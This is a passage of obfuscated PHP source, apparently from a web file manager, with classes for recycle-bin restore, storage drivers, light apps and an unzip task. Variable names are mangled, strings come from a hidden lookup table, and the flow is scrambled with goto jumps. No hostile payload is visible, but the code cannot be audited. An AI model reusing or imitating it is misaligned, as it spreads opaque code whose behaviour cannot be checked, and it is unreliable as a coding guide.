$Fœ«ÅƒÚé¡->remove($f§Ö¾‡“àñ, !1); $AêÄåòÀ = $this->where(array($a‡§Ò¤Éğ[366] => $f§Ö¾‡“àñ))->find(); $cšÀ¥Šàìº = $AêÄåòÀ[$a‡§Ò¤Éğ[368]] . $a‡§Ò¤Éğ[71] . $AêÄåòÀ[$a‡§Ò¤Éğ[452]]; $fÙñ´¾ùğ…[$cšÀ¥Šàìº] = array($a‡§Ò¤Éğ[514] => $AêÄåòÀ[$a‡§Ò¤Éğ[368]], $a‡§Ò¤Éğ[452] => $AêÄåòÀ[$a‡§Ò¤Éğ[452]]); $this->where(array($a‡§Ò¤Éğ[366] => $f§Ö¾‡“àñ))->delete(); } goto eÈ¸®ïœŞ™; b»˜Õ¶ù¾ƒ: $a‡§Ò¤Éğ =& $_SERVER[÷ÖêïÔÔÓ]; $Fœ«ÅƒÚé¡ = Model($a‡§Ò¤Éğ[1077]); $f«¬›è¨ìù = $this->listData(); goto EÂçÜ©‹õ; eÈ¸®ïœŞ™: foreach ($fÙñ´¾ùğ… as $Cò‘İå¼…‚) { $Fœ«ÅƒÚé¡->targetSpaceUpdate($Cò‘İå¼…‚[$a‡§Ò¤Éğ[368]], $Cò‘İå¼…‚[$a‡§Ò¤Éğ[452]]); } goto f¸ƒñ‘; f¸ƒñ‘: } public function restore($f¶‡ºÀ†µÛ = false) { goto f±é¦¬•í; f±é¦¬•í: $E¤Ñ„ßììø =& $_SERVER[÷ÖêïÔÔÓ]; $B£Ç¢ß­± = Model($E¤Ñ„ßììø[1077]); $dÊÅÎÔ‹é§ = $this->listData(); goto BÃÓÖ†ö¾”; BÃÓÖ†ö¾”: $f¶‡ºÀ†µÛ = $f¶‡ºÀ†µÛ == !1 ? !1 : $f¶‡ºÀ†µÛ; if (!$dÊÅÎÔ‹é§) { return !0; } $F¤Õïš½ä’ = array(); goto B†‚•íøß; B†‚•íøß: foreach ($dÊÅÎÔ‹é§ as $F­‰ˆÎ„à») { goto C’ˆ›²Üí; C’ˆ›²Üí: if ($f¶‡ºÀ†µÛ != !1 && !in_array($F­‰ˆÎ„à», $f¶‡ºÀ†µÛ)) { continue; } $Eˆ…˜˜¢ãî = $B£Ç¢ß­±->sourceInfo($F­‰ˆÎ„à»); $d­ø¦—îİ = $B£Ç¢ß­±->sourceInfo($Eˆ…˜˜¢ãî[$E¤Ñ„ßììø[457]]); goto d¡Á­Ş¬¢Ğ; d¡Á­Ş¬¢Ğ: if ($d­ø¦—îİ[$E¤Ñ„ßììø[393]] == $E¤Ñ„ßììø[493]) { continue; } $B£Ç¢ß­±->lockMoveStart($F­‰ˆÎ„à»); $this->recycleMove($F­‰ˆÎ„à», 0); goto Bç“ùô›“Œ; Bç“ùô›“Œ: if ($Eˆ…˜˜¢ãî[$E¤Ñ„ßììø[367]] == $E¤Ñ„ßììø[493]) { $a¤à®Á§é = array($E¤Ñ„ßììø[518] => array($E¤Ñ„ßììø[475], $Eˆ…˜˜¢ãî[$E¤Ñ„ßììø[455]] . $F­‰ˆÎ„à» . $E¤Ñ„ßììø[476])); $B£Ç¢ß­±->where($a¤à®Á§é)->setField($E¤Ñ„ßììø[393], 0); } $this->where(array($E¤Ñ„ßììø[366] => $F­‰ˆÎ„à»))->delete(); $B£Ç¢ß­±->folderSizeReset($Eˆ…˜˜¢ãî[$E¤Ñ„ßììø[457]]); goto b¶‡¨„â¬¥; b¶‡¨„â¬¥: $F¤Õïš½ä’[] = $Eˆ…˜˜¢ãî[$E¤Ñ„ßììø[457]]; if ($Eˆ…˜˜¢ãî[$E¤Ñ„ßììø[367]] == $E¤Ñ„ßììø[493]) { $F¤Õïš½ä’[] = $F­‰ˆÎ„à»; } $B£Ç¢ß­±->lockMoveEnd($F­‰ˆÎ„à»); goto AÏ†³±È¤; AÏ†³±È¤: } $B£Ç¢ß­±->updateModifyTime($F¤Õïš½ä’); goto fçŞå‡Í“; fçŞå‡Í“: } private function recycleMove($eòŸâ¿¥±â, $FŠùé²áŒß = 1) { $bŠ¨Õ¾Õµƒ =& $_SERVER[÷ÖêïÔÔÓ]; $c¨¼ÃÅó“ = Model($bŠ¨Õ¾Õµƒ[1077]); $c›ğãá¨º = Model($bŠ¨Õ¾Õµƒ[2242]); $eğêŞ„ô = array($bŠ¨Õ¾Õµƒ[366] => $eòŸâ¿¥±â); if ($FŠùé²áŒß) { $c¨¼ÃÅó“->where($eğêŞ„ô)->setField($bŠ¨Õ¾Õµƒ[393], 1); $c›ğãá¨º->eventRecycle($eòŸâ¿¥±â, $bŠ¨Õ¾Õµƒ[2243]); } else { $bˆãÓŒ¹Ü” = $c¨¼ÃÅó“->where($eğêŞ„ô)->find(); $cŸÏŠ’ùô = $bˆãÓŒ¹Ü”[$bŠ¨Õ¾Õµƒ[367]] == $bŠ¨Õ¾Õµƒ[493]; $e˜“¤Öµá = $c¨¼ÃÅó“->fileNameAuto($bˆãÓŒ¹Ü”[$bŠ¨Õ¾Õµƒ[457]], $bˆãÓŒ¹Ü”[$bŠ¨Õ¾Õµƒ[28]], REPEAT_RENAME_FOLDER, $cŸÏŠ’ùô); if ($e˜“¤Öµá != $bˆãÓŒ¹Ü”[$bŠ¨Õ¾Õµƒ[28]]) { $c¨¼ÃÅó“->rename($eòŸâ¿¥±â, $e˜“¤Öµá); } $c¨¼ÃÅó“->where($eğêŞ„ô)->setField($bŠ¨Õ¾Õµƒ[393], 0); $c›ğãá¨º->eventRecycle($eòŸâ¿¥±â, $bŠ¨Õ¾Õµƒ[2244]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\x2e\163\164\x6f\x72\141\x67\x65\x4c\x69\163\164"; public $field = array("\x6e\141\155\x65", "\x73\x69\x7a\x65\115\141\x78", "\x73\171\163\164\145\155", "\144\x65\x66\x61\x75\x6c\x74", "\x64\x72\x69\x76\x65\162", "\x63\x6f\156\x66\x69\x67"); public function listData($fº“Šéˆ…Ü = false, $FïìÏ·³ˆÆ = "\155\157\x64\151\146\x79\124\x69\155\x65", $D•‹˜®ïÎØ = false) { goto báê×¶³µ; d‚ÕÊöğÃ: return $aˆØ½ãö÷´; goto CÚ»‘’®Ó“; Dìáè°Ã¦: foreach ($aˆØ½ãö÷´ as $b²˜Ùà›‘© => $dßàìÊË¬) { unset($aˆØ½ãö÷´[$b²˜Ùà›‘©][$bŒÊ¤†ÜŸÁ[6]]); $aˆØ½ãö÷´[$b²˜Ùà›‘©][$bŒÊ¤†ÜŸÁ[1990]] = 0; } $C²„Ó¢µ«Ş = array_to_keyvalue($aˆØ½ãö÷´, $bŒÊ¤†ÜŸÁ[33], $bŒÊ¤†ÜŸÁ[364]); $this->_listAppendSize($aˆØ½ãö÷´, $C²„Ó¢µ«Ş); goto d‚ÕÊöğÃ; báê×¶³µ: $bŒÊ¤†ÜŸÁ =& $_SERVER[÷ÖêïÔÔÓ]; $aˆØ½ãö÷´ = parent::listData($fº“Šéˆ…Ü, $FïìÏ·³ˆÆ, $D•‹˜®ïÎØ); if ($fº“Šéˆ…Ü) { return $aˆØ½ãö÷´; } goto Dìáè°Ã¦; CÚ»‘’®Ó“: } public function _listAppendSize(&$F¬åÍ¤¢ÙÎ, $EøßàÄ„Œº) { $C¥Ş¥³Ÿ› =& $_SERVER[÷ÖêïÔÔÓ]; $c¥‘¯§§ÎÚ = $C¥Ş¥³Ÿ›[2245] . implode($C¥Ş¥³Ÿ›[47], $EøßàÄ„Œº) . $C¥Ş¥³Ÿ›[2246]; $b·è‹´¡‰» = Model($C¥Ş¥³Ÿ›[708])->query($c¥‘¯§§ÎÚ); $b·è‹´¡‰» = array_to_keyvalue($b·è‹´¡‰», $C¥Ş¥³Ÿ›[364], $C¥Ş¥³Ÿ›[78]); foreach ($F¬åÍ¤¢ÙÎ as $BßğçÌ¨§ => $B½å›« «Œ) { $F¬åÍ¤¢ÙÎ[$BßğçÌ¨§][$C¥Ş¥³Ÿ›[1990]] = isset($b·è‹´¡‰»[$B½å›« «Œ[$C¥Ş¥³Ÿ›[364]]]) ? $b·è‹´¡‰»[$B½å›« «Œ[$C¥Ş¥³Ÿ›[364]]] : 0; } } public function getConfig($B‹ ·ïñ„Õ) { $AäãÛõá´ç = parent::listData($B‹ ·ïñ„Õ); return json_decode($AäãÛõá´ç[$_SERVER[÷ÖêïÔÔÓ][6]], !0); } public function update($c˜Êï²ÁÙ, $Fƒ®Ç±ÎÈŒ) { goto F›™¢Áó˜; F›™¢Áó˜: $DÓŒ‹¿Ò =& $_SERVER[÷ÖêïÔÔÓ]; $cŞÆ‘ÂÁãñ = $Fƒ®Ç±ÎÈŒ[$DÓŒ‹¿Ò[28]]; $a×«Œ£øÜ = array_to_keyvalue(parent::listData(), $DÓŒ‹¿Ò[28]); goto f‚ÙÕÂÂÈÏ; ašƒß’ƒŠ«: $B‹˜”ĞØ× = parent::update($c˜Êï²ÁÙ, $Fƒ®Ç±ÎÈŒ); if ($B‹˜”ĞØ× && $Fƒ®Ç±ÎÈŒ[$DÓŒ‹¿Ò[34]]) { foreach ($a×«Œ£øÜ as $Fé‡Š¨Õ¯Á) { if ($Fé‡Š¨Õ¯Á[$DÓŒ‹¿Ò[34]] && $Fé‡Š¨Õ¯Á[$DÓŒ‹¿Ò[364]] != $c˜Êï²ÁÙ) { parent::update($Fé‡Š¨Õ¯Á[$DÓŒ‹¿Ò[364]], array($DÓŒ‹¿Ò[34] => 0)); } } } return $B‹˜”ĞØ×; goto B‘´éäÆ¦È; f‚ÙÕÂÂÈÏ: if (isset($a×«Œ£øÜ[$cŞÆ‘ÂÁãñ]) && $a×«Œ£øÜ[$cŞÆ‘ÂÁãñ][$DÓŒ‹¿Ò[364]] != $c˜Êï²ÁÙ) { return !1; } if (isset($Fƒ®Ç±ÎÈŒ[$DÓŒ‹¿Ò[2247]]) && $Fƒ®Ç±ÎÈŒ[$DÓŒ‹¿Ò[2247]] == $DÓŒ‹¿Ò[493]) { $this->checkConfig($Fƒ®Ç±ÎÈŒ); } unset($Fƒ®Ç±ÎÈŒ[$DÓŒ‹¿Ò[2247]]); goto ašƒß’ƒŠ«; B‘´éäÆ¦È: } public function add($BÖ¥Î¸©Ë) { goto f™ÊÌ¥‘‚ó; Cµ”Ğ‘ÕÜÛ: $this->checkConfig($BÖ¥Î¸©Ë); $FĞ‘±Ù…¿ = parent::insert($BÖ¥Î¸©Ë); if ($FĞ‘±Ù…¿ && $BÖ¥Î¸©Ë[$B»ëõ‡¦¼[34]]) { foreach ($dŠéèŒ¹”¿ as $aî´¤ç”­) { if ($aî´¤ç”­[$B»ëõ‡¦¼[34]]) { parent::update($aî´¤ç”­[$B»ëõ‡¦¼[364]], array($B»ëõ‡¦¼[34] => 0)); } } } goto bË•Õæ¸»; f™ÊÌ¥‘‚ó: $B»ëõ‡¦¼ =& $_SERVER[÷ÖêïÔÔÓ]; $dŠéèŒ¹”¿ = array_to_keyvalue(parent::listData(), $B»ëõ‡¦¼[28]); if (isset($dŠéèŒ¹”¿[$BÖ¥Î¸©Ë[$B»ëõ‡¦¼[28]]])) { return !1; } goto Cµ”Ğ‘ÕÜÛ; bË•Õæ¸»: return $FĞ‘±Ù…¿; goto DÑ”‹Şàß; DÑ”‹Şàß: } public function checkConfig(&$Cğğ·¦ô‹²) { goto aË°…äÛ®§; f±õòè°ë¤: $A‡‡ê‚µ¬ğ = $e‡™ğÔé¹‚[72] . $eãÑİíÆ…‡; $f‹†øÕ›·± = new $A‡‡ê‚µ¬ğ($a¦™íÄªŠ); if (in_array($fõ¸íŞ”©·, $f‹†øÕ›·±->objectDriver)) { if (!$f‹†øÕ›·±->isBucketCors() && !$f‹†øÕ›·±->setBucketCors()) { show_json(LNG($e‡™ğÔé¹‚[2248]), !1); } } goto F±¬İˆßÇ›; F±¬İˆßÇ›: $Bµ›Â÷‰ºØ = $f‹†øÕ›·±->getPath($c›­‹Ò¦Ìº . $e‡™ğÔé¹‚[1887]); if (!$f‹†øÕ›·±->mkfile($Bµ›Â÷‰ºØ)) { show_json(LNG($e‡™ğÔé¹‚[2249]), !1); } $a¦™íÄªŠ[$e‡™ğÔé¹‚[996]] = $c›­‹Ò¦Ìº; goto a×ĞŒÑ»´; a×ĞŒÑ»´: $Cğğ·¦ô‹²[$e‡™ğÔé¹‚[6]] = json_encode($a¦™íÄªŠ); $Cğğ·¦ô‹²[$e‡™ğÔé¹‚[89]] = $eãÑİíÆ…‡; return !0; goto A„ëí©¾ôµ; aË°…äÛ®§: $e‡™ğÔé¹‚ =& $_SERVER[÷ÖêïÔÔÓ]; $fõ¸íŞ”©· = strtolower($Cğğ·¦ô‹²[$e‡™ğÔé¹‚[89]]); $a¦™íÄªŠ = json_decode_force($Cğğ·¦ô‹²[$e‡™ğÔé¹‚[6]]); goto fÛæÃÊˆÙÌ; fÛæÃÊˆÙÌ: foreach ($a¦™íÄªŠ as $d¦ÚÚÕÙª• => $C‹ğÜ½ïÛ) { $a¦™íÄªŠ[$d¦ÚÚÕÙª•] = trim($C‹ğÜ½ïÛ); } $c›­‹Ò¦Ìº = rtrim($a¦™íÄªŠ[$e‡™ğÔé¹‚[996]], $e‡™ğÔé¹‚[8]) . $e‡™ğÔé¹‚[8]; $eãÑİíÆ…‡ = $this->driverType($fõ¸íŞ”©·); goto f±õòè°ë¤; A„ëí©¾ôµ: } private function driverType($d¾İéåÄœ) { $D±Ù¼·ùŠ =& $_SERVER[÷ÖêïÔÔÓ]; $e¡éÍ…”ØÆ = array($D±Ù¼·ùŠ[102] => $D±Ù¼·ùŠ[2250], $D±Ù¼·ùŠ[58] => $D±Ù¼·ùŠ[2251], $D±Ù¼·ùŠ[65] => $D±Ù¼·ùŠ[997]); if (isset($e¡éÍ…”ØÆ[$d¾İéåÄœ])) { return $e¡éÍ…”ØÆ[$d¾İéåÄœ]; } return strtoupper($d¾İéåÄœ); } public function driverListSystem() { $E›ç‰ÓøÉ¦ =& $_SERVER[÷ÖêïÔÔÓ]; $f†²àßù‡ã = parent::listData(); $D§õºß‚ = array(); foreach ($f†²àßù‡ã as $a‰¿Æê˜¨ˆ) { unset($a‰¿Æê˜¨ˆ[$E›ç‰ÓøÉ¦[184]], $a‰¿Æê˜¨ˆ[$E›ç‰ÓøÉ¦[106]]); $a‰¿Æê˜¨ˆ[$E›ç‰ÓøÉ¦[6]] = json_decode_force($a‰¿Æê˜¨ˆ[$E›ç‰ÓøÉ¦[6]]); $D§õºß‚[] = $a‰¿Æê˜¨ˆ; } return $D§õºß‚; } public function defaultDriver() { $a»‹ÖÖØ¼ =& $_SERVER[÷ÖêïÔÔÓ]; $có‹ÍÇ«¬Å = parent::listData(); $DÖá¸æ›ØÄ = array_filter_by_field($có‹ÍÇ«¬Å, $a»‹ÖÖØ¼[34], 1); $DÖá¸æ›ØÄ = $DÖá¸æ›ØÄ[0]; if ($DÖá¸æ›ØÄ) { $DÖá¸æ›ØÄ[$a»‹ÖÖØ¼[6]] = json_decode($DÖá¸æ›ØÄ[$a»‹ÖÖØ¼[6]], !0); } return $DÖá¸æ›ØÄ; } public function driverInfo($bë†ô¨¹Šõ) { $dÕ ¶­’íŸ =& $_SERVER[÷ÖêïÔÔÓ]; $EùŠÓÅÖ‰Ù = array_to_keyvalue(parent::listData(), $dÕ ¶­’íŸ[364]); if (!isset($EùŠÓÅÖ‰Ù[$bë†ô¨¹Šõ])) { return !1; } $A¿¸³°Âí˜ = $EùŠÓÅÖ‰Ù[$bë†ô¨¹Šõ]; $A¿¸³°Âí˜[$dÕ ¶­’íŸ[6]] = json_decode_force($A¿¸³°Âí˜[$dÕ ¶­’íŸ[6]]); return $A¿¸³°Âí˜; } public function removeWithFile($Dêëºõ‡Ş£) { goto dîù¦¨‰°›; cµ¥µÜ…‘: $BÇ ğŒ…— = Model($CÜ©°Ûê¼[164])->where($B‡ˆ¸†Ï„)->field($CÜ©°Ûê¼[2255])->select(); foreach ($BÇ ğŒ…— as $dÌ•¨†îì³) { goto Bé½ôãëŒ; A´ºÈÇ±à­: if (!IO::exist($CŠ‚œ‰Îšï) && !IO::move($FÚŞÒ„óŸİ, $CŠ‚œ‰Îšï)) { continue; } $B‡ˆ¸†Ï„ = array($CÜ©°Ûê¼[415] => $dÌ•¨†îì³[$CÜ©°Ûê¼[415]]); $EÜ¡ÆšŠ¾× = array($CÜ©°Ûê¼[709] => $BèŠáÔœŒ, $CÜ©°Ûê¼[76] => $CŠ‚œ‰Îšï); goto aõÇ„ ´±; Bé½ôãëŒ: $FÚŞÒ„óŸİ = $dÌ•¨†îì³[$CÜ©°Ûê¼[76]]; $CŠ‚œ‰Îšï = $AÃñÃõ . str_replace("\x7b\x69\x6f\x3a{$Dêëºõ‡Ş£}\175\x2f", $CÜ©°Ûê¼[33], $FÚŞÒ„óŸİ); if (!IO::exist($FÚŞÒ„óŸİ)) { $this->removeByFileID($dÌ•¨†îì³[$CÜ©°Ûê¼[415]]); continue; } goto A´ºÈÇ±à­; aõÇ„ ´±: Model($CÜ©°Ûê¼[164])->where($B‡ˆ¸†Ï„)->save($EÜ¡ÆšŠ¾×); goto b“ê¢¡ŒĞ; b“ê¢¡ŒĞ: } return parent::remove($Dêëºõ‡Ş£); goto fšñÈßÈŞî; dîù¦¨‰°›: $CÜ©°Ûê¼ =& $_SERVER[÷ÖêïÔÔÓ]; $B‡ˆ¸†Ï„ = array($CÜ©°Ûê¼[709] => $Dêëºõ‡Ş£); $C´Ñ†˜ØÃ = Model($CÜ©°Ûê¼[418])->where($B‡ˆ¸†Ï„)->count(); goto e™Ü¬˜æŠÖ; F«“ªÓÂß’: $d«ñäò¦Š = KodIO::defaultDriver(); $BèŠáÔœŒ = $d«ñäò¦Š[$CÜ©°Ûê¼[364]]; $AÃñÃõ = "\x7b\151\157\x3a{$BèŠáÔœŒ}\175\x2f"; goto cµ¥µÜ…‘; e™Ü¬˜æŠÖ: $eÍºëè¡çÃ = Model($CÜ©°Ûê¼[418])->where($B‡ˆ¸†Ï„)->sum($CÜ©°Ûê¼[78]); $f‘·ó‚óÂö = new TaskFileTransfer($CÜ©°Ûê¼[2252] . $Dêëºõ‡Ş£, $CÜ©°Ûê¼[2253], $C´Ñ†˜ØÃ, LNG($CÜ©°Ûê¼[2254]) . "\50{$Dêëºõ‡Ş£}\51"); $f‘·ó‚óÂö->task[$CÜ©°Ûê¼[684]] = $eÍºëè¡çÃ; goto F«“ªÓÂß’; fšñÈßÈŞî: } public function progress($b¨îí¬šÕÓ) { return Task::get($_SERVER[÷ÖêïÔÔÓ][2252] . $b¨îí¬šÕÓ); } private function removeByFileID($b·«¶Æ”Ò) { $Díâ¸ÚÙ‰ =& $_SERVER[÷ÖêïÔÔÓ]; $f­ƒˆ®³©Ô = Model($Díâ¸ÚÙ‰[1077])->field($Díâ¸ÚÙ‰[2232])->where(array($Díâ¸ÚÙ‰[415] => $b·«¶Æ”Ò))->select(); $f­ƒˆ®³©Ô = array_to_keyvalue($f­ƒˆ®³©Ô, $Díâ¸ÚÙ‰[33], $Díâ¸ÚÙ‰[366]); foreach ($f­ƒˆ®³©Ô as $fÖŸ¿‘­Ò¶) { Model($Díâ¸ÚÙ‰[379])->remove($fÖŸ¿‘­Ò¶, !1); } } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\56\x4c\151\x67\x68\164\101\160\160"; public $modelType = "\123\x79\x73\x74\145\155\117\x70\164\151\x6f\x6e"; public $field = array("\x6e\x61\x6d\x65", "\147\162\157\165\x70", "\144\145\x73\143", "\143\x6f\156\164\x65\156\164"); public function listData($EË¤Ÿ¯áŒ = false, $E¢ÁÜÔËÓ = "\155\x6f\x64\151\x66\171\124\x69\x6d\145", $BÏáÅ‡…”» = true) { return parent::listData($EË¤Ÿ¯áŒ, $E¢ÁÜÔËÓ, $BÏáÅ‡…”»); } public function remove($cãÕ¼ùºÈ) { $A¸ëğÌùã = $this->findByName($cãÕ¼ùºÈ); if (!$A¸ëğÌùã) { return !1; } return parent::remove($A¸ëğÌùã[$_SERVER[÷ÖêïÔÔÓ][364]]); } public function add($D›”ÂôèÙ†) { if ($this->findByName($D›”ÂôèÙ†[$_SERVER[÷ÖêïÔÔÓ][28]])) { return !1; } return parent::insert($D›”ÂôèÙ†); } public function update($c…ÑÅù¤ñÍ, $aÕÕõæÀ×“) { $B’„³²£¢á =& $_SERVER[÷ÖêïÔÔÓ]; $Fì“«•¤Ôˆ = $this->findByName($c…ÑÅù¤ñÍ); $d®ôÎ»§ß = $this->findByName($aÕÕõæÀ×“[$B’„³²£¢á[28]]); if (!$Fì“«•¤Ôˆ || $d®ôÎ»§ß && $d®ôÎ»§ß[$B’„³²£¢á[364]] != $Fì“«•¤Ôˆ[$B’„³²£¢á[364]]) { return !1; } return parent::update($Fì“«•¤Ôˆ[$B’„³²£¢á[364]], $aÕÕõæÀ×“); } } goto A°š½Ù„îé; Aõ¤«Šˆ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto B­‹Ê‹‡î; c‹Ÿ”Ÿåí: if (!$c˜˜„‹ğÒ–[$eñ•ô¬‰µØ[1237]]) { $c˜˜„‹ğÒ–[$eñ•ô¬‰µØ[1237]] = LNG($eñ•ô¬‰µØ[1410]); } goto DÊìò£ùå; B­‹Ê‹‡î: $eñ•ô¬‰µØ =& $_SERVER[÷ÖêïÔÔÓ]; parent::startAfter(); Hook::bind($eñ•ô¬‰µØ[1406], array($this, $eñ•ô¬‰µØ[1407])); goto bŸÉäŸÅª½; bŸÉäŸÅª½: Hook::bind($eñ•ô¬‰µØ[1009], array($this, $eñ•ô¬‰µØ[1408])); $c˜˜„‹ğÒ– =& $this->task; $c˜˜„‹ğÒ–[$eñ•ô¬‰µØ[1409]] = $eñ•ô¬‰µØ[1014]; goto c‹Ÿ”Ÿåí; DÊìò£ùå: } protected function endAfter() { $Bé£ÄÂö°¤ =& $_SERVER[÷ÖêïÔÔÓ]; parent::endAfter(); Hook::unbind($Bé£ÄÂö°¤[1406], array($this, $Bé£ÄÂö°¤[1407])); Hook::unbind($Bé£ÄÂö°¤[1009], array($this, $Bé£ÄÂö°¤[1408])); } public function updateAfter() { $e°—ÉÄÜò =& $_SERVER[÷ÖêïÔÔÓ]; $F½ˆƒÂ•…‰ =& $this->task; if (!$F½ˆƒÂ•…‰[$e°—ÉÄÜò[1284]] || !$F½ˆƒÂ•…‰[$e°—ÉÄÜò[684]]) { return; } if ($F½ˆƒÂ•…‰[$e°—ÉÄÜò[1409]] == $e°—ÉÄÜò[1014]) { $AŞÎõšÕ‘ = 0; if ($F½ˆƒÂ•…‰[$e°—ÉÄÜò[1386]]) { $AŞÎõšÕ‘ = $F½ˆƒÂ•…‰[$e°—ÉÄÜò[1387]] / $F½ˆƒÂ•…‰[$e°—ÉÄÜò[1386]]; } $F½ˆƒÂ•…‰[$e°—ÉÄÜò[1342]] = $AŞÎõšÕ‘ * 0.3; } else { if ($F½ˆƒÂ•…‰[$e°—ÉÄÜò[1409]] == $e°—ÉÄÜò[298]) { $AŞÎõšÕ‘ = $F½ˆƒÂ•…‰[$e°—ÉÄÜò[1289]] / $F½ˆƒÂ•…‰[$e°—ÉÄÜò[1284]]; $F½ˆƒÂ•…‰[$e°—ÉÄÜò[1342]] = 0.3 + $AŞÎõšÕ‘ * 0.4; } else { if ($F½ˆƒÂ•…‰[$e°—ÉÄÜò[1409]] == $e°—ÉÄÜò[90]) { $fÍ¥ª¨˜„ = 0; if ($F½ˆƒÂ•…‰[$e°—ÉÄÜò[1388]] == $e°—ÉÄÜò[90]) { $fÍ¥ª¨˜„ = $F½ˆƒÂ•…‰[$e°—ÉÄÜò[1387]]; } $AŞÎõšÕ‘ = ($F½ˆƒÂ•…‰[$e°—ÉÄÜò[1391]] + $fÍ¥ª¨˜„) / $F½ˆƒÂ•…‰[$e°—ÉÄÜò[684]]; $F½ˆƒÂ•…‰[$e°—ÉÄÜò[1342]] = 0.3 + 0.4 + $AŞÎõšÕ‘ * 0.3; } } } if ($F½ˆƒÂ•…‰[$e°—ÉÄÜò[1342]] > 0) { $C¡ÔãòÊª = timeFloat() - $F½ˆƒÂ•…‰[$e°—ÉÄÜò[1344]] - $F½ˆƒÂ•…‰[$e°—ÉÄÜò[1347]]; $F½ˆƒÂ•…‰[$e°—ÉÄÜò[1348]] = $C¡ÔãòÊª * (1 - $F½ˆƒÂ•…‰[$e°—ÉÄÜò[1342]]) / $F½ˆƒÂ•…‰[$e°—ÉÄÜò[1342]]; } } public function addFile($f’“­ÂÃ¿›) { goto C¡¯ñâ›÷§; AÓ¶À¶ßÎƒ: $this->update(); goto f¢ŒÔ¿ÒØæ; C£Š‰¥‡¹: $aºéÃ—‚ËÓ[$a‡²‹ºŸò·[1286]] = $a‡²‹ºŸò·[1399]; $aºéÃ—‚ËÓ[$a‡²‹ºŸò·[1388]] = $a‡²‹ºŸò·[1014]; $aºéÃ—‚ËÓ[$a‡²‹ºŸò·[684]] = $F‰ßƒÇšĞÔ[$a‡²‹ºŸò·[78]]; goto c›â†ë¼‡º; e‰ô‰Ò¸ä‘: $aºéÃ—‚ËÓ[$a‡²‹ºŸò·[1384]] = $F‰ßƒÇšĞÔ[$a‡²‹ºŸò·[28]]; $aºéÃ—‚ËÓ[$a‡²‹ºŸò·[1386]] = $F‰ßƒÇšĞÔ[$a‡²‹ºŸò·[78]]; $aºéÃ—‚ËÓ[$a‡²‹ºŸò·[1387]] = 0; goto C£Š‰¥‡¹; c›â†ë¼‡º: $aºéÃ—‚ËÓ[$a‡²‹ºŸò·[1284]] = 1; $Aª­Îğ‚™£ = 0; $aºéÃ—‚ËÓ[$a‡²‹ºŸò·[1392]] = array($a‡²‹ºŸò·[1393] => $Aª­Îğ‚™£ + 1, $a‡²‹ºŸò·[383] => $F‰ßƒÇšĞÔ[$a‡²‹ºŸò·[28]], $a‡²‹ºŸò·[76] => $F‰ßƒÇšĞÔ[$a‡²‹ºŸò·[76]], $a‡²‹ºŸò·[462] => $F‰ßƒÇšĞÔ[$a‡²‹ºŸò·[462]] ? $F‰ßƒÇšĞÔ[$a‡²‹ºŸò·[462]] : $F‰ßƒÇšĞÔ[$a‡²‹ºŸò·[76]]); goto AÓ¶À¶ßÎƒ; C¡¯ñâ›÷§: $a‡²‹ºŸò· =& $_SERVER[÷ÖêïÔÔÓ]; $aºéÃ—‚ËÓ =& $this->task; $F‰ßƒÇšĞÔ = IO::info($f’“­ÂÃ¿›); goto e‰ô‰Ò¸ä‘; f¢ŒÔ¿ÒØæ: } public function unzipAfter($c¢‰œõ¦Ûë) { goto DƒÅââËññ; DÎ–İŒö„©: $b‘åô›ë[$C»…”¬¨ÕÇ[1384]] = $C»…”¬¨ÕÇ[33]; $b‘åô›ë[$C»…”¬¨ÕÇ[1391]] = 0; $b‘åô›ë[$C»…”¬¨ÕÇ[684]] = $dàš°İ÷¾„[$C»…”¬¨ÕÇ[78]]; goto aíÏëóæµ; AŒÜ„óÔïœ: $dàš°İ÷¾„ = IO::infoWithChildren($c¢‰œõ¦Ûë); $D«ø¤šçœ = 0; $b‘åô›ë[$C»…”¬¨ÕÇ[1392]] = array($C»…”¬¨ÕÇ[1393] => $D«ø¤šçœ + 1, $C»…”¬¨ÕÇ[383] => $dàš°İ÷¾„[$C»…”¬¨ÕÇ[28]], $C»…”¬¨ÕÇ[76] => $dàš°İ÷¾„[$C»…”¬¨ÕÇ[76]], $C»…”¬¨ÕÇ[462] => $dàš°İ÷¾„[$C»…”¬¨ÕÇ[462]] ? $dàš°İ÷¾„[$C»…”¬¨ÕÇ[462]] : $dàš°İ÷¾„[$C»…”¬¨ÕÇ[76]]); goto D“Ò‘“â‚º; DƒÅââËññ: $C»…”¬¨ÕÇ =& $_SERVER[÷ÖêïÔÔÓ]; $b‘åô›ë =& $this->task; $b‘åô›ë[$C»…”¬¨ÕÇ[1409]] = $C»…”¬¨ÕÇ[90]; goto AŒÜ„óÔïœ; D“Ò‘“â‚º: if ($dàš°İ÷¾„[$C»…”¬¨ÕÇ[29]] == $C»…”¬¨ÕÇ[164]) { $b‘åô›ë[$C»…”¬¨ÕÇ[1284]] = 1; } else { $b‘åô›ë[$C»…”¬¨ÕÇ[1284]] = $dàš°İ÷¾„[$C»…”¬¨ÕÇ[81]][$C»…”¬¨ÕÇ[79]]; } $b‘åô›ë[$C»…”¬¨ÕÇ[1286]] = $C»…”¬¨ÕÇ[33]; $b‘åô›ë[$C»…”¬¨ÕÇ[1388]] = 0; goto EòÑçáÈé; EòÑçáÈé: $b‘åô›ë[$C»…”¬¨ÕÇ[1289]] = 0; $b‘åô›ë[$C»…”¬¨ÕÇ[1386]] = 0; $b‘åô›ë[$C»…”¬¨ÕÇ[1387]] = 0; goto DÎ–İŒö„©; aíÏëóæµ: $this->update(); self::log($C»…”¬¨ÕÇ[1411] . json_encode(array($b‘åô›ë, $dàš°İ÷¾„))); goto BËéÖëˆå˜; BËéÖëˆå˜: } public function nameParse($eë˜¦¦é•­) { goto b÷ôÖ°¼Æ¶; dÍˆåßò­: $this->update(); goto D‡‰‹†¥äâ; b÷ôÖ°¼Æ¶: $dÌÔª¿ÛÅ =& $_SERVER[÷ÖêïÔÔÓ]; $B©Şƒœ¦á =& $this->task; if ($B©Şƒœ¦á[$dÌÔª¿ÛÅ[1409]] == $dÌÔª¿ÛÅ[1014]) { $B©Şƒœ¦á[$dÌÔª¿ÛÅ[1409]] = $dÌÔª¿ÛÅ[298]; $B©Şƒœ¦á[$dÌÔª¿ÛÅ[1391]] = 0; $B©Şƒœ¦á[$dÌÔª¿ÛÅ[684]] = 0; } goto e­¼ñŞ“˜·; e­¼ñŞ“˜·: $e¬†¿Ûİ¶ = get_path_this($eë˜¦¦é•­); if 